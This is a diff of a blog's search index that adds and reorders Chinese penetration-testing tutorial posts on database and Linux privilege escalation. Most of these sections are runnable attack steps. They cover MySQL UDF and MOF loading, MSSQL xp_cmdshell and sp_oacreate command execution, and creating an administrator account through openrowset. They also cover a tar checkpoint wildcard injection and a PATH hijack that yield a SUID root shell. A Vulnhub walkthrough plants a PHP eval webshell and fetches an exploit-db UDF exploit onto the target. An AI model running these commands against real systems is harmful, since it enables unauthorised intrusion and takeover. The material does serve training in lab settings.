@@ -1,6 +1,108 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>关于自己</title>
+    <url>/2021/10/09/my-first-blog/</url>
+    <content><![CDATA[<p>欢迎来到我的博客，我会发布一下有关渗透的博文，请多交流！</p>
+<span id="more"></span>]]></content>
+      <categories>
+        <category>个人介绍</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>个人介绍</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>权限提升-MY&amp;MS&amp;ORA等SQL数据库提权</title>
+    <url>/2021/10/09/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-MY&amp;MS&amp;ORA%E7%AD%89SQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/</url>
+    <content><![CDATA[<p>在利用系统溢出漏洞无果的情况下，可以采用数据库进行提权，但需要知道<strong>数据库提权</strong>的<strong>前提条件：</strong><br /><strong>服务器开启数据库服务及获取到最高权限用户密码</strong>。除Access数据库外，其他数据库基本都存在数据库提权的可能。</p>
+<span id="more"></span><br />#数据库应用提权在权限提升中的意义 <br />#WEB 或本地环境如何探针数据库应用 <br />#数据库提权权限用户密码收集等方法<br />#目前数据库提权对应的技术及方法等<br />
+<p><br />Mysql的密码：<br />select * from mysql.user;<br /><strong><br /></strong>#案例1.MYSQL数据库提权演示-脚本&amp;MSF**<br /><strong>流程：服务探针-信息收集-提权利用-获取权限</strong><br /><strong>UDF提权原理：</strong><br />UDF（User-Defined-Function），即用户自定义函数，通过新添加函数对MySQL的功能进行扩充。根据MySQL用户自定义函数的功能，写入有执行系统命令的UDF，通过调用此UDF，达到提权的命令。<br />MySQL数据库提权需要满足以下几个条件：</p>
+<ol>
+<li>MySQL服务以管理员权限启动。</li>
+<li>获取了MySQL”root“用户的密码</li>
+<li>MySQL可以连接</li>
+</ol>
+<p><strong>MOF提权原理：</strong><br />托管对象格式（MOF）文件是创建和注册提供程序、事件类别和事件的简便方法。MOF文件每隔5秒就会监控进程的创建和死亡，或MySQL是以管理员身份启动，并且可以往MOF的文件路径”C:/windows/system32/wbem/mof” 中写入文件，便可以通过上传MOF进行提权。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.UDF提权知识点：（基于MYSQL调用命令执行函数）</span><br><span class="line">读取网站数据配置文件（了解其命名规则及查找技巧）</span><br><span class="line">sql data inc config conn database common include等</span><br><span class="line"></span><br><span class="line">读取数据库存储或备份文件（了解其数据库存储格式及对应内容）</span><br><span class="line">MYSQL/data/mysql/user.MYD	#账号密码</span><br><span class="line"></span><br><span class="line">@@basedir/data/数据库名/表名.myd</span><br><span class="line">（表名.myd存储的数据）</span><br><span class="line">利用脚本暴力破解（了解数据库是否支持外联及如何开启外联）</span><br><span class="line">远程本地暴力破解，服务器本地暴力破解</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">利用自定义函数导出dll文件进行命令执行</span><br><span class="line">select version() </span><br><span class="line">select @@basedir</span><br><span class="line">手工创建plugin目录或利用HTFS流创建</span><br><span class="line">select &#x27;x&#x27; into dumpfile &#x27;目录/lib/plugin::INDEX_ALLOCATION&#x27;;</span><br><span class="line">1.mysql&lt;5.1 导出目录：c:/windows或system32</span><br><span class="line">2.mysql =&gt;5.1 导出安装目录/lib/plugin</span><br><span class="line"></span><br><span class="line">2.MOF知识点：（基于MYSQL特性的安全问题）</span><br><span class="line">导出自定义mof文件到系统目录加载</span><br><span class="line">https://www.cnblogs.com/xishaonian/p/6384535.html</span><br><span class="line">select load_file(&#x27;C:/phpStudy/PHPTutorial/WWW/user_add.mof</span><br><span class="line">&#x27;) into dumpfile &#x27;c:/windows/system32/wbem/mof/nullevt.mof&#x27;;</span><br><span class="line">3.启动项知识点：（基于配合操作系统自启动）</span><br><span class="line">msf 实战上传到启动目录</span><br><span class="line"></span><br><span class="line">导出自定义可执行文件到启动目录配合重启执行</span><br><span class="line">将创建好的后门或执行文件进行服务器启动项写入，配置重启执行！	#DDOS</span><br><span class="line">数据库开启外联：</span><br><span class="line">GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;mypassword&#x27; WITH GRANT OPTION 	#予任何主机访问数据的权限</span><br><span class="line"></span><br><span class="line">4.反弹知识点：（基于利用反弹特性命令执行）</span><br><span class="line">nc -l -p 5577	#监听5577端口</span><br></pre></td></tr></table></figure>
+
+<br />
+<br />**#案例2.Mssql数据库提权演示-连接客户端（一般默认支持外联）**<br />流程：服务探针-信息收集（得到sa密码）-提权利用-获取权限
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.适用xp_cmdshell进行提权</span><br><span class="line">xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后的版本中则默认禁止。如果用户拥有管理员sa权限则可以用sp_configure重修开启它。</span><br><span class="line">启用：</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"></span><br><span class="line">关闭：</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">执行：</span><br><span class="line">EXEC master.dbo.xp_cmdshell &#x27;命令&#x27;</span><br><span class="line">如果 xp_cmdshell 被删除了，可以上传 xplog70.dll 进行恢复</span><br><span class="line">exec master.sys.sp_addextendedproc &#x27;xp_cmdshell&#x27;, &#x27;C:\Program Files\Microsoft SQL</span><br><span class="line">Server\MSSQL\Binn\xplog70.dll&#x27;</span><br><span class="line"></span><br><span class="line">2.适用sp_oacreate进行提权</span><br><span class="line">主要用来调用OLE对象，利用OLE对象的run方法执行系统命令。</span><br><span class="line">启用：</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 1;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br><span class="line"></span><br><span class="line">关闭：</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 0;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br><span class="line"></span><br><span class="line">执行：</span><br><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod</span><br><span class="line">@shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c whoami &gt;c:\\1.txt	#不输出到txt可能无回显</span><br><span class="line"></span><br><span class="line">3.适用SQL Server沙盒提权</span><br><span class="line">参考资料：https://blog.51cto.com/u_11797152/2411770</span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;,1;reconfigure;</span><br><span class="line">-- 不开启的话在执行 xp_regwrite 会提示让我们开启，</span><br><span class="line">exec sp_configure &#x27;Ad Hoc Distributed Queries&#x27;,1;reconfigure;</span><br><span class="line">--关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码。</span><br><span class="line">exec master..xp_regwrite</span><br><span class="line">&#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,0;</span><br><span class="line">--查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句。</span><br><span class="line">exec master.dbo.xp_regread &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,</span><br><span class="line">&#x27;SandBoxMode&#x27;</span><br><span class="line">-- 执 行 系 统 命 令 select * from</span><br><span class="line">openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;,&#x27;select shell(&quot;net user</span><br><span class="line">margin margin /add&quot;)&#x27;)</span><br><span class="line">select * from</span><br><span class="line">openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;,&#x27;select shell(&quot;net</span><br><span class="line">localgroup administrators margin /add&quot;)&#x27;)</span><br><span class="line">沙盒模式 SandBoxMode 参数含义（默认是 2）</span><br></pre></td></tr></table></figure>
+**#案例3.**<br />**普通用户模式：**<br />前提是拥有一个普通的oracle连接账号，不需要DBA权限，可提权至DBA，并以oracle实例运行的权限执行操作系统命令。<br />
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DBA用户模式：（自动化工具演示）</span><br><span class="line">拥有DBA账号密码，可以省去自己手动创建存储过程的繁琐步骤，一键执行测试。</span><br><span class="line"></span><br><span class="line">注入提升模式：（sqlmap测试演示）</span><br><span class="line">拥有一个oracle注入点，可以通过注入点直接执行系统命令，此种模式没有实现回显，需要自己验证。</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+        <category>权限提升</category>
+        <category>小迪安全</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>内网渗透</tag>
+        <tag>权限提升</tag>
+        <tag>数据库</tag>
+        <tag>小迪安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>权限提升-Linux定时任务&amp;环境变量&amp;数据库</title>
+    <url>/2021/10/09/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1&amp;%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F&amp;%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
+    <content><![CDATA[<p><strong>#案例1.Linux提权本地环境变量安全-本地</strong><br /><strong>配合SUID进行环境变量提权-本地用户环境</strong><br /><strong>手写调用文件-编译-复制文件-增加环境变量-执行触发</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc demo.c -o shell</span><br><span class="line">cp /bin/sh /tmp/ps</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">./shell</span><br><span class="line">id</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+
+<p><br />demo.c</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;ps&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/3e81aad1db625676f4cb8eab6cd69da1.png" alt="image.png"></p>
+<ol>
+<li><p><strong>路径问题</strong></p>
+<ol>
+<li>利用计划任务指向的文件的相对路径解析问题<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /ect/crontab</span><br><span class="line">echo &#x27;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#x27; &gt; /home/xiaodi/test.sh</span><br><span class="line">chmod +x /home/xiaodi/test.sh</span><br><span class="line">/tmp/bash</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+<li><p><strong>命令问题</strong></p>
+<ol>
+<li>利用通配符配合命令参数自定义命令实现提权</li>
+<li>不安全定时任务备份命令：<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">cd /home/undead/script;tar czf /tmp/backup.tar.gz *	<span class="meta">#backup.sh</span></span><br><span class="line">echo <span class="string">&#x27;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#x27;</span> &gt; /home/undead/script/test.sh</span><br><span class="line">echo <span class="string">&quot;&quot;</span> &gt; <span class="string">&quot;--checkpoint-action=exec=sh test.sh&quot;</span></span><br><span class="line">echo <span class="string">&quot;&quot;</span> &gt; --checkpoint=<span class="number">1</span></span><br><span class="line">cd /tmp</span><br><span class="line">./bash -p</span><br></pre></td></tr></table></figure>
+<a href="https://www.cnblogs.com/manong--/p/8012324.html">https://www.cnblogs.com/manong–/p/8012324.htm</a><a href="https://www.cnblogs.com/manong--/p/8012324.html">l</a><br />test.sh<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /bin/bash /tmp/bash; chmod +s /tmp/bash</span><br></pre></td></tr></table></figure>
+<img src="https://img-blog.csdnimg.cn/img_convert/4836db792acf034e0b392330b79b59af.png" alt="image.png"></li>
+</ol>
+</li>
+<li><p><strong>权限问题</strong></p>
+<ol>
+<li>利用不安全的权限分配操作导致的定时文件覆盖</li>
+<li>chmod 777 775 等 所有者 组 其他成员说明</li>
+</ol>
+</li>
+</ol>
+<p><strong>#案例3.Linux提权数据库MYSQL_UDF-Vulnhub</strong><br /><a href="https://www.vulnhub.com/entry/raven-2,269/">https://www.vulnhub.com/entry/raven-2,269/</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Vulnhub 某靶机-探针 IP 及端口-利用漏洞获取 web 权限-信息收集-查看数据库配置文件-利用 Mysql 提</span><br><span class="line">权 Linux（Mysql 版本区别同 Windows）</span><br><span class="line">#探针 IP 及端口</span><br><span class="line">nmap 192.168.76.0/24</span><br><span class="line">#利用 phpmailer 漏洞进行修改并反弹</span><br><span class="line">python D:/Myproject/40974.py</span><br><span class="line">nc -lvvp 4444</span><br><span class="line">#写入后门利用菜刀连接方便操作</span><br><span class="line">echo &#x27;&lt;?php eval($_POST[x]);?&gt;&#x27; &gt;1.php</span><br><span class="line">上传信息收集脚本进行提权信息收集</span><br><span class="line">./LinEnum.sh</span><br><span class="line">翻阅数据库配置文件获取 root 密码</span><br><span class="line">#利用 Mysql 提权 searchsploit</span><br><span class="line">下载 mysql udf poc 进行编译</span><br><span class="line">wget https://www.exploit-db.com/download/1518</span><br><span class="line">mv 1518 raptor_udf.c</span><br><span class="line">gcc -g -c raptor_udf.c</span><br><span class="line">gcc -g -shared -o raptor_udf.so raptor_udf.o -lc</span><br><span class="line">mv raptor_udf.so 1518.so</span><br><span class="line">下载 1518 到目标服务器</span><br><span class="line">wget https://xx.xx.xx.xx/1518.so</span><br><span class="line">进入数据库进行 UDF 导出</span><br><span class="line">use mysql;</span><br><span class="line">create table foo(line blob);</span><br><span class="line">insert into foo values(load_file(&#x27;/tmp/1518.so&#x27;));</span><br><span class="line">select * from foo into dumpfile &#x27;/usr/lib/mysql/plugin/1518.so&#x27;;</span><br><span class="line">创建 do_system 函数调用</span><br><span class="line">create function do_system returns integer soname &#x27;1518.so&#x27;；</span><br><span class="line">select do_system(&#x27;chmod u+s /usr/bin/find&#x27;);</span><br><span class="line">#配合使用 find 调用执行</span><br><span class="line">touch xiaodi</span><br><span class="line">find xiaodi –exec &quot;whoami&quot; \;</span><br><span class="line">find xiaodi –exec &quot;/bin/sh&quot; \;</span><br><span class="line">id</span><br></pre></td></tr></table></figure>
+<p><strong>#案例4.Linux提权提升简单总结归类-参考PDF</strong></p>
+<ol>
+<li>提权环境，信息收集（SUID，定时任务，可能漏掉，第三方服务应用等）</li>
+<li>最新相关漏洞要明确（关注点），二次开发相关脚本学会展望（四个脚本）</li>
+<li>本地searchsploit脚本及远程exploitdb站点搜索说明（简要使用）</li>
+<li>其他提权方法：密码复用，guid，sudo等说明（运气，同理，鸡肋等）</li>
+</ol>
+<p>SUDO参考说明：<a href="https://www.freebuf.com/vuls/217089.html">https://www.freebuf.com/vuls/217089.html</a><br />**<br>考说明：<a href="https://www.freebuf.com/vuls/217089.html">https://www.freebuf.com/vuls/217089.html</a><br />**</p>
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+        <category>权限提升</category>
+        <category>小迪安全</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>内网渗透</tag>
+        <tag>权限提升</tag>
+        <tag>数据库</tag>
+        <tag>小迪安全</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Xray基础使用介绍</title>
     <url>/2021/10/10/Xray%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E4%BB%8B%E7%BB%8D/</url>
     <content><![CDATA[<p>官方使用文档：<br /><a href="https://docs.xray.cool/">https://docs.xray.cool/</a><br /><strong>#xray简介</strong><br />xray 是一款功能强大的安全评估工具，由多名经验丰富的一线安全从业者呕心打造而成，<span id="more"></span>主要特性有:</p>
@@ -107,53 +209,6 @@
         <tag>ctf</tag>
         <tag>weblogic</tag>
         <tag>内网穿透</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>关于自己</title>
-    <url>/2021/10/09/my-first-blog/</url>
-    <content><![CDATA[<p>欢迎来到我的博客，我会发布一下有关渗透的博文，请多交流！</p>
-<span id="more"></span>]]></content>
-      <categories>
-        <category>个人介绍</category>
-      </categories>
-      <tags>
-        <tag>渗透测试</tag>
-        <tag>个人介绍</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>权限提升-MY&amp;MS&amp;ORA等SQL数据库提权</title>
-    <url>/2021/10/09/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-MY&amp;MS&amp;ORA%E7%AD%89SQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/</url>
-    <content><![CDATA[<p>在利用系统溢出漏洞无果的情况下，可以采用数据库进行提权，但需要知道<strong>数据库提权</strong>的<strong>前提条件：</strong><br /><strong>服务器开启数据库服务及获取到最高权限用户密码</strong>。除Access数据库外，其他数据库基本都存在数据库提权的可能。</p>
-<span id="more"></span><br />#数据库应用提权在权限提升中的意义 <br />#WEB 或本地环境如何探针数据库应用 <br />#数据库提权权限用户密码收集等方法<br />#目前数据库提权对应的技术及方法等<br />
-<p><br />Mysql的密码：<br />select * from mysql.user;<br /><strong><br /></strong>#案例1.MYSQL数据库提权演示-脚本&amp;MSF**<br /><strong>流程：服务探针-信息收集-提权利用-获取权限</strong><br /><strong>UDF提权原理：</strong><br />UDF（User-Defined-Function），即用户自定义函数，通过新添加函数对MySQL的功能进行扩充。根据MySQL用户自定义函数的功能，写入有执行系统命令的UDF，通过调用此UDF，达到提权的命令。<br />MySQL数据库提权需要满足以下几个条件：</p>
-<ol>
-<li>MySQL服务以管理员权限启动。</li>
-<li>获取了MySQL”root“用户的密码</li>
-<li>MySQL可以连接</li>
-</ol>
-<p><strong>MOF提权原理：</strong><br />托管对象格式（MOF）文件是创建和注册提供程序、事件类别和事件的简便方法。MOF文件每隔5秒就会监控进程的创建和死亡，或MySQL是以管理员身份启动，并且可以往MOF的文件路径”C:/windows/system32/wbem/mof” 中写入文件，便可以通过上传MOF进行提权。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.UDF提权知识点：（基于MYSQL调用命令执行函数）</span><br><span class="line">读取网站数据配置文件（了解其命名规则及查找技巧）</span><br><span class="line">sql data inc config conn database common include等</span><br><span class="line"></span><br><span class="line">读取数据库存储或备份文件（了解其数据库存储格式及对应内容）</span><br><span class="line">MYSQL/data/mysql/user.MYD	#账号密码</span><br><span class="line"></span><br><span class="line">@@basedir/data/数据库名/表名.myd</span><br><span class="line">（表名.myd存储的数据）</span><br><span class="line">利用脚本暴力破解（了解数据库是否支持外联及如何开启外联）</span><br><span class="line">远程本地暴力破解，服务器本地暴力破解</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">利用自定义函数导出dll文件进行命令执行</span><br><span class="line">select version() </span><br><span class="line">select @@basedir</span><br><span class="line">手工创建plugin目录或利用HTFS流创建</span><br><span class="line">select &#x27;x&#x27; into dumpfile &#x27;目录/lib/plugin::INDEX_ALLOCATION&#x27;;</span><br><span class="line">1.mysql&lt;5.1 导出目录：c:/windows或system32</span><br><span class="line">2.mysql =&gt;5.1 导出安装目录/lib/plugin</span><br><span class="line"></span><br><span class="line">2.MOF知识点：（基于MYSQL特性的安全问题）</span><br><span class="line">导出自定义mof文件到系统目录加载</span><br><span class="line">https://www.cnblogs.com/xishaonian/p/6384535.html</span><br><span class="line">select load_file(&#x27;C:/phpStudy/PHPTutorial/WWW/user_add.mof</span><br><span class="line">&#x27;) into dumpfile &#x27;c:/windows/system32/wbem/mof/nullevt.mof&#x27;;</span><br><span class="line">3.启动项知识点：（基于配合操作系统自启动）</span><br><span class="line">msf 实战上传到启动目录</span><br><span class="line"></span><br><span class="line">导出自定义可执行文件到启动目录配合重启执行</span><br><span class="line">将创建好的后门或执行文件进行服务器启动项写入，配置重启执行！	#DDOS</span><br><span class="line">数据库开启外联：</span><br><span class="line">GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;mypassword&#x27; WITH GRANT OPTION 	#予任何主机访问数据的权限</span><br><span class="line"></span><br><span class="line">4.反弹知识点：（基于利用反弹特性命令执行）</span><br><span class="line">nc -l -p 5577	#监听5577端口</span><br></pre></td></tr></table></figure>
-
-<br />
-<br />**#案例2.Mssql数据库提权演示-连接客户端（一般默认支持外联）**<br />流程：服务探针-信息收集（得到sa密码）-提权利用-获取权限
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.适用xp_cmdshell进行提权</span><br><span class="line">xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后的版本中则默认禁止。如果用户拥有管理员sa权限则可以用sp_configure重修开启它。</span><br><span class="line">启用：</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"></span><br><span class="line">关闭：</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">执行：</span><br><span class="line">EXEC master.dbo.xp_cmdshell &#x27;命令&#x27;</span><br><span class="line">如果 xp_cmdshell 被删除了，可以上传 xplog70.dll 进行恢复</span><br><span class="line">exec master.sys.sp_addextendedproc &#x27;xp_cmdshell&#x27;, &#x27;C:\Program Files\Microsoft SQL</span><br><span class="line">Server\MSSQL\Binn\xplog70.dll&#x27;</span><br><span class="line"></span><br><span class="line">2.适用sp_oacreate进行提权</span><br><span class="line">主要用来调用OLE对象，利用OLE对象的run方法执行系统命令。</span><br><span class="line">启用：</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 1;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br><span class="line"></span><br><span class="line">关闭：</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 0;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br><span class="line"></span><br><span class="line">执行：</span><br><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod</span><br><span class="line">@shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c whoami &gt;c:\\1.txt	#不输出到txt可能无回显</span><br><span class="line"></span><br><span class="line">3.适用SQL Server沙盒提权</span><br><span class="line">参考资料：https://blog.51cto.com/u_11797152/2411770</span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;,1;reconfigure;</span><br><span class="line">-- 不开启的话在执行 xp_regwrite 会提示让我们开启，</span><br><span class="line">exec sp_configure &#x27;Ad Hoc Distributed Queries&#x27;,1;reconfigure;</span><br><span class="line">--关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码。</span><br><span class="line">exec master..xp_regwrite</span><br><span class="line">&#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,0;</span><br><span class="line">--查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句。</span><br><span class="line">exec master.dbo.xp_regread &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,</span><br><span class="line">&#x27;SandBoxMode&#x27;</span><br><span class="line">-- 执 行 系 统 命 令 select * from</span><br><span class="line">openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;,&#x27;select shell(&quot;net user</span><br><span class="line">margin margin /add&quot;)&#x27;)</span><br><span class="line">select * from</span><br><span class="line">openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;,&#x27;select shell(&quot;net</span><br><span class="line">localgroup administrators margin /add&quot;)&#x27;)</span><br><span class="line">沙盒模式 SandBoxMode 参数含义（默认是 2）</span><br></pre></td></tr></table></figure>
-**#案例3.**<br />**普通用户模式：**<br />前提是拥有一个普通的oracle连接账号，不需要DBA权限，可提权至DBA，并以oracle实例运行的权限执行操作系统命令。<br />
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DBA用户模式：（自动化工具演示）</span><br><span class="line">拥有DBA账号密码，可以省去自己手动创建存储过程的繁琐步骤，一键执行测试。</span><br><span class="line"></span><br><span class="line">注入提升模式：（sqlmap测试演示）</span><br><span class="line">拥有一个oracle注入点，可以通过注入点直接执行系统命令，此种模式没有实现回显，需要自己验证。</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>内网渗透</category>
-        <category>权限提升</category>
-        <category>小迪安全</category>
-      </categories>
-      <tags>
-        <tag>渗透测试</tag>
-        <tag>内网渗透</tag>
-        <tag>权限提升</tag>
-        <tag>数据库</tag>
-        <tag>小迪安全</tag>
       </tags>
   </entry>
 </search>
